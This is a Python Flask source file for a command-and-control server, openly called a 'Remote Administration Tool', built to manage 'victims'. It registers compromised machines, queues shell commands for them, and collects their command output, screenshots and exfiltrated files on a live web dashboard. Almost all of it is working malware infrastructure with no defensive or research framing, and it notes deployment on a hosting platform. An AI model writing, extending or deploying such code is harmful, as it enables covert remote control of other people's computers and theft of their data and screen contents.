#!/usr/bin/env python3
"""
C2 Server - Complete Remote Administration Tool Server
Features:
- Victim management
- File upload/download
- Screenshots
- Shell commands
- Web interface
- Real-time status
"""

from flask import Flask, render_template, request, jsonify, send_file, redirect, url_for
from flask_socketio import SocketIO, emit
import sqlite3
import os
import os
import datetime
import uuid
import base64
import json
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.config['SECRET_KEY'] = 'c2-secret-key-change-this'
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024  # 50MB max
socketio = SocketIO(app, cors_allowed_origins="*")

# Database setup
DB_PATH = 'c2_database.db'

def init_db():
    """Initialize database"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    # Victims table
    c.execute('''CREATE TABLE IF NOT EXISTS victims (
        id TEXT PRIMARY KEY,
        hostname TEXT,
        username TEXT,
        os TEXT,
        ip_address TEXT,
        first_seen TEXT,
        last_seen TEXT,
        status TEXT,
        screenshot_path TEXT
    )''')

    # Commands table
    c.execute('''CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id TEXT,
        command TEXT,
        status TEXT,
        result TEXT,
        timestamp TEXT,
        FOREIGN KEY (victim_id) REFERENCES victims (id)
    )''')

    # Files table
    c.execute('''CREATE TABLE IF NOT EXISTS downloaded_files (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id TEXT,
        filename TEXT,
        filepath TEXT,
        size INTEGER,
        download_time TEXT,
        FOREIGN KEY (victim_id) REFERENCES victims (id)
    )''')

    conn.commit()
    conn.close()

# Ensure directories exist
os.makedirs('uploads', exist_ok=True)
os.makedirs('screenshots', exist_ok=True)
os.makedirs('logs', exist_ok=True)

init_db()

def get_db_connection():
    """Get database connection"""
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

# ==================== WEB INTERFACE ====================

@app.route('/')
def index():
    """Main dashboard"""
    conn = get_db_connection()
    victims = conn.execute('SELECT * FROM victims ORDER BY last_seen DESC').fetchall()
    active_count = conn.execute('SELECT COUNT(*) as count FROM victims WHERE status = "online"').fetchone()['count']
    total_count = len(victims)
    conn.close()

    return render_template('dashboard.html',
                         victims=victims,
                         active_count=active_count,
                         total_count=total_count)

@app.route('/victim/<victim_id>')
def victim_details(victim_id):
    """Victim details page"""
    conn = get_db_connection()
    victim = conn.execute('SELECT * FROM victims WHERE id = ?', (victim_id,)).fetchone()

    if not victim:
        conn.close()
        return "Victim not found", 404

    commands = conn.execute('SELECT * FROM commands WHERE victim_id = ? ORDER BY timestamp DESC LIMIT 50',
                          (victim_id,)).fetchall()
    files = conn.execute('SELECT * FROM downloaded_files WHERE victim_id = ? ORDER BY download_time DESC LIMIT 50',
                        (victim_id,)).fetchall()

    conn.close()

    return render_template('victim.html',
                         victim=victim,
                         commands=commands,
                         files=files)

@app.route('/api/victims')
def api_victims():
    """API: Get all victims"""
    conn = get_db_connection()
    victims = conn.execute('SELECT * FROM victims ORDER BY last_seen DESC').fetchall()
    conn.close()

    return jsonify([dict(v) for v in victims])

@app.route('/api/victim/<victim_id>', methods=['GET', 'POST'])
def api_victim(victim_id):
    """API: Get or update victim info"""
    conn = get_db_connection()

    if request.method == 'POST':
        # Update victim info (from client)
        data = request.json
        conn.execute('''UPDATE victims SET
            hostname = ?,
            username = ?,
            os = ?,
            ip_address = ?,
            last_seen = ?,
            status = 'online'
            WHERE id = ?''',
            (data.get('hostname'),
             data.get('username'),
             data.get('os'),
             data.get('ip_address'),
             datetime.datetime.now().isoformat(),
             victim_id))

        conn.commit()

        # Check for pending commands
        pending_commands = conn.execute('''
            SELECT command FROM commands
            WHERE victim_id = ? AND status = 'pending'
            ORDER BY timestamp ASC LIMIT 1
        ''', (victim_id,)).fetchall()

        if pending_commands:
            cmd = pending_commands[0]['command']
            conn.execute('UPDATE commands SET status = "sent" WHERE command = ?', (cmd,))
            conn.commit()
            conn.close()
            return jsonify({'command': cmd})

        conn.close()
        return jsonify({'command': None})

    # GET request
    victim = conn.execute('SELECT * FROM victims WHERE id = ?', (victim_id,)).fetchone()
    conn.close()

    if not victim:
        return jsonify({'error': 'Victim not found'}), 404

    return jsonify(dict(victim))

@app.route('/api/register', methods=['POST'])
def api_register():
    """API: Register new victim"""
    data = request.json
    victim_id = str(uuid.uuid4())

    conn = get_db_connection()
    conn.execute('''INSERT INTO victims (id, hostname, username, os, ip_address, first_seen, last_seen, status)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
        (victim_id,
         data.get('hostname', 'Unknown'),
         data.get('username', 'Unknown'),
         data.get('os', 'Unknown'),
         data.get('ip_address', 'Unknown'),
         datetime.datetime.now().isoformat(),
         datetime.datetime.now().isoformat(),
         'online'))

    conn.commit()
    conn.close()

    socketio.emit('new_victim', {'victim_id': victim_id})
    return jsonify({'victim_id': victim_id})

@app.route('/api/command', methods=['POST'])
def api_command():
    """API: Send command to victim"""
    data = request.json
    victim_id = data.get('victim_id')
    command = data.get('command')

    if not victim_id or not command:
        return jsonify({'error': 'Missing data'}), 400

    conn = get_db_connection()
    conn.execute('''INSERT INTO commands (victim_id, command, status, timestamp)
        VALUES (?, ?, 'pending', ?)''',
        (victim_id, command, datetime.datetime.now().isoformat()))

    conn.commit()
    conn.close()

    return jsonify({'success': True})

@app.route('/api/command_result', methods=['POST'])
def api_command_result():
    """API: Receive command result from victim"""
    data = request.json
    victim_id = data.get('victim_id')
    command = data.get('command')
    result = data.get('result')

    conn = get_db_connection()
    conn.execute('''UPDATE commands SET result = ?, status = 'completed'
        WHERE victim_id = ? AND command = ? AND status != 'completed'
        ORDER BY timestamp DESC LIMIT 1''',
        (result, victim_id, command))

    conn.commit()
    conn.close()

    socketio.emit('command_result', {
        'victim_id': victim_id,
        'command': command,
        'result': result
    })

    return jsonify({'success': True})

@app.route('/api/screenshot', methods=['POST'])
def api_screenshot():
    """API: Receive screenshot from victim"""
    if 'screenshot' not in request.files:
        return jsonify({'error': 'No file'}), 400

    victim_id = request.form.get('victim_id')
    file = request.files['screenshot']

    if file and victim_id:
        filename = f"screenshot_{victim_id}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        filepath = os.path.join('screenshots', filename)
        file.save(filepath)

        # Update victim screenshot path
        conn = get_db_connection()
        conn.execute('UPDATE victims SET screenshot_path = ? WHERE id = ?',
                    (filepath, victim_id))
        conn.commit()
        conn.close()

        socketio.emit('new_screenshot', {
            'victim_id': victim_id,
            'filepath': filepath
        })

        return jsonify({'success': True})

    return jsonify({'error': 'Invalid data'}), 400

@app.route('/api/upload', methods=['POST'])
def api_upload_file():
    """API: Upload file to victim"""
    if 'file' not in request.files:
        return jsonify({'error': 'No file'}), 400

    victim_id = request.form.get('victim_id')
    file = request.files['file']

    if file and victim_id:
        filename = secure_filename(file.filename)
        filepath = os.path.join('uploads', f"{victim_id}_{filename}")
        file.save(filepath)

        # Add to downloads list
        file_size = os.path.getsize(filepath)
        conn = get_db_connection()
        conn.execute('''INSERT INTO downloaded_files (victim_id, filename, filepath, size, download_time)
            VALUES (?, ?, ?, ?, ?)''',
            (victim_id, filename, filepath, file_size, datetime.datetime.now().isoformat()))
        conn.commit()
        conn.close()

        socketio.emit('file_downloaded', {
            'victim_id': victim_id,
            'filename': filename
        })

        return jsonify({'success': True, 'filepath': filepath})

    return jsonify({'error': 'Invalid data'}), 400

@app.route('/screenshot/<victim_id>')
def get_screenshot(victim_id):
    """Get victim screenshot"""
    conn = get_db_connection()
    victim = conn.execute('SELECT screenshot_path FROM victims WHERE id = ?', (victim_id,)).fetchone()
    conn.close()

    if victim and victim['screenshot_path'] and os.path.exists(victim['screenshot_path']):
        return send_file(victim['screenshot_path'])

    return "No screenshot", 404

@app.route('/heartbeat/<victim_id>', methods=['POST'])
def heartbeat(victim_id):
    """Heartbeat from victim"""
    conn = get_db_connection()
    conn.execute('''UPDATE victims SET
        last_seen = ?,
        status = 'online'
        WHERE id = ?''',
        (datetime.datetime.now().isoformat(), victim_id))
    conn.commit()
    conn.close()

    return jsonify({'success': True})

# ==================== WEBSOCKET EVENTS ====================

@socketio.on('connect')
def handle_connect():
    """Client connects"""
    emit('connected', {'data': 'Connected to C2 server'})

@socketio.on('disconnect')
def handle_disconnect():
    """Client disconnects"""
    print('Client disconnected')

# ==================== MAIN ====================

if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════════════╗
    ║     C2 SERVER - Remote Administration Tool    ║
    ╚══════════════════════════════════════════════╝

    Server running at: http://0.0.0.0:5000
    Dashboard: http://localhost:5000

    Press Ctrl+C to stop
    """)

    # Check if running in production (Railway, etc.)
    debug_mode = os.getenv('DEBUG', 'false').lower() == 'true'

    socketio.run(app, host='0.0.0.0', port=5000, debug=debug_mode)